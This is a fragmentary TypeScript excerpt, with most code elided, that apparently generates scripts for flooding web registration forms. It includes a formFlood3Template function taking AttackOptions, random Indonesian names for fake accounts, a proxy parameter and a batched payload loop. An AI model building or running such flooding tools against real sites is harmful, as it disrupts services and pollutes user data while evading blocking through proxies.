...
export function formFlood3Template(opts: AttackOptions): string {
    ...
    check(res, {
      "status was 200": (r) => r.status === 200 || r.status === 422,
    });
  }`;
...
function randomName() {
  const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fitri', 'Gita', 'Hadi', 'Indah', 'Joko', 'Kartini', 'Lestari', 'Maya', 'Nugroho', 'Putri', 'Rahman', 'Sari', 'Teguh', 'Wati', 'Yanto'];
  const lastNames = ['Santoso', 'Wijaya', 'Kusuma', 'Putra', 'Dewi', 'Sari', 'Hartono', 'Susanto', 'Lestari', 'Pratama', 'Utami', 'Budiman', 'Suryadi', 'Ningsih', 'Hidayat'];
...
${proxyParam}
  ...
  for (let i = 0; i < BATCH_SIZE; i++) {
    ...
    const payload = JSON.stringify(registerData);
